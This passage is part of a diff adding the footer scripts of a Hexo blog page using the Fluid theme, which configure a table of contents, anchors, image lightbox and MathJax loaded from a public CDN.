+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
